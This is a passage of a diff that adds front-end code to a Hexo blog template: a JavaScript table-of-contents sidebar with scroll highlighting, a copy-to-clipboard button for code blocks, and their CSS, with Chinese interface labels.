+  toc.innerHTML = '<div class="toc-title">目录</div><div class="toc-content"><ul class="toc-list"></ul></div>';
+
+  var tocList = toc.querySelector('.toc-list');
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'heading-' + i;
+    }
+
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-' + h.tagName.toLowerCase();
+
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    a.title = h.textContent;
+    a.addEventListener('click', function(e) {
+      e.preventDefault();
+      h.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+
+    li.appendChild(a);
+    tocList.appendChild(li);
+  });
+
+  document.body.appendChild(toc);
+
+  // 滚动高亮
+  var tocLinks = tocList.querySelectorAll('a');
+  function updateActive() {
+    var scrollPos = window.scrollY + 150;
+    var activeIdx = 0;
+
+    headings.forEach(function(h, i) {
+      if (h.offsetTop <= scrollPos) {
+        activeIdx = i;
+      }
+    });
+
+    tocLinks.forEach(function(link, i) {
+      if (i === activeIdx) {
+        link.parentElement.classList.add('active');
+      } else {
+        link.parentElement.classList.remove('active');
+      }
+    });
+  }
+
+  // 显示/隐藏逻辑
+  function checkVisibility() {
+    var articleRect = article.getBoundingClientRect();
+    var scrollY = window.scrollY;
+
+    // 当文章在视口内时显示目录
+    if (scrollY > 200 && articleRect.bottom > 200) {
+      toc.classList.add('visible');
+    } else {
+      toc.classList.remove('visible');
+    }
+  }
+
+  window.addEventListener('scroll', function() {
+    updateActive();
+    checkVisibility();
+  });
+
+  updateActive();
+  checkVisibility();
+})();
+</script>
+<style>
+.article-toc-sidebar {
+  position: fixed;
+  left: 10px;
+  top: 20px;
+  width: 140px;
+  max-height: calc(100vh - 300px);
+  background: rgba(30, 32, 35, 0.95);
+  border: 1px solid #474d54;
+  border-radius: 8px;
+  padding: 15px;
+  z-index: 100;
+  opacity: 0;
+  transform: translateX(-20px);
+  transition: opacity 0.3s, transform 0.3s;
+  pointer-events: none;
+  overflow: hidden;
+}
+.article-toc-sidebar.visible {
+  opacity: 1;
+  transform: translateX(0);
+  pointer-events: auto;
+}
+.toc-title {
+  font-size: 14px;
+  font-weight: bold;
+  color: #6dc1e7;
+  margin-bottom: 12px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid #474d54;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+.toc-content {
+  max-height: calc(100vh - 550px);
+  overflow-y: auto;
+}
+.toc-content::-webkit-scrollbar {
+  width: 4px;
+}
+.toc-content::-webkit-scrollbar-thumb {
+  background: #474d54;
+  border-radius: 2px;
+}
+.toc-list {
+  list-style: none;
+  margin: 0;
+  padding: 0;
+}
+.toc-item {
+  margin: 8px 0;
+  line-height: 1.4;
+}
+.toc-item a {
+  color: #b8bfc6;
+  text-decoration: none;
+  font-size: 13px;
+  display: block;
+  padding: 4px 8px;
+  border-radius: 4px;
+  transition: all 0.2s;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+.toc-item a:hover {
+  color: #6dc1e7;
+  background: rgba(109, 193, 231, 0.1);
+}
+.toc-item.active a {
+  color: #6dc1e7;
+  background: rgba(109, 193, 231, 0.15);
+  font-weight: bold;
+}
+.toc-h3 {
+  margin-left: 12px;
+}
+.toc-h3 a {
+  font-size: 12px;
+}
+.toc-h4 {
+  margin-left: 24px;
+}
+.toc-h4 a {
+  font-size: 11px;
+  color: #9da2a6;
+}
+@media (max-width: 1200px) {
+  .article-toc-sidebar {
+    width: 140px;
+    left: 8px;
+  }
+}
+@media (max-width: 900px) {
+  .article-toc-sidebar {
+    display: none;
+  }
+}
+</style>
+
+<script>
+(function() {
+  document.querySelectorAll('figure.highlight').forEach(function(block) {
+    var codeNode = block.querySelector('.code pre');
+    if (!codeNode) return;
+
+    var button = document.createElement('button');
+    button.className = 'code-copy-btn';
+    button.type = 'button';
+    button.title = '复制代码';
+    button.setAttribute('aria-label', '复制代码');
+    button.innerHTML = '<span class="fa fa-copy" aria-hidden="true"></span>';
+    block.appendChild(button);
+
+    function setState(state) {
+      var succeeded = state === 'copied';
+      button.classList.toggle('copied', succeeded);
+      button.setAttribute('aria-label', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
+      button.setAttribute('title', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
+      button.innerHTML = '<span class="fa fa-' + (succeeded ? 'check' : state === 'failed' ? 'times' : 'copy') + '" aria-hidden="true"></span>';
+    }
+
+    function fallbackCopy(text) {
+      var textarea = document.createElement('textarea');
+      textarea.value = text;
+      textarea.style.position = 'fixed';
+      textarea.style.opacity = '0';
+      document.body.appendChild(textarea);
+      textarea.select();
+      var copied = document.execCommand('copy');
+      document.body.removeChild(textarea);
+      return copied;
+    }
+
+    button.addEventListener('click', function() {
+      var text = codeNode.textContent;
+      var operation = navigator.clipboard
+        ? navigator.clipboard.writeText(text).then(function() { return true; })
+        : Promise.resolve(fallbackCopy(text));
+
+      operation.then(function(copied) {
+        setState(copied ? 'copied' : 'failed');
+      }).catch(function() {
+        setState(fallbackCopy(text) ? 'copied' : 'failed');
+      }).finally(function() {
+        setTimeout(function() { setState('idle'); }, 1800);
+      });
+    });
+  });
+})();
+</script>
+<style>
+.code-copy-btn {
+  position: absolute;
+  top: 8px;
+  right: 8px;
+  z-index: 10;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 30px;
+  height: 28px;
+  padding: 0;
+  background: rgba(13, 16, 18, 0.9);
+  border: 1px solid var(--gk-border);
+  border-radius: 3px;
+  color: var(--gk-muted);
+  cursor: pointer;
+  font-size: 11px;
+  opacity: 0.62;
+  transition: color 150ms ease, border-color 150ms ease, opacity 150ms ease;
+}
+
+figure.highlight:hover .code-copy-btn,
+.code-copy-btn:focus-visible {
+  opacity: 1;
+}
+
+.code-copy-btn:hover {
+  border-color: var(--gk-cyan);
+  color: var(--gk-cyan);
+}
+
+.code-copy-btn.copied {
+  border-color: var(--gk-green);
+  color: var(--gk-green);
+}
+</style>
+<!-- hexo injector body_end end --></body>
+</html>
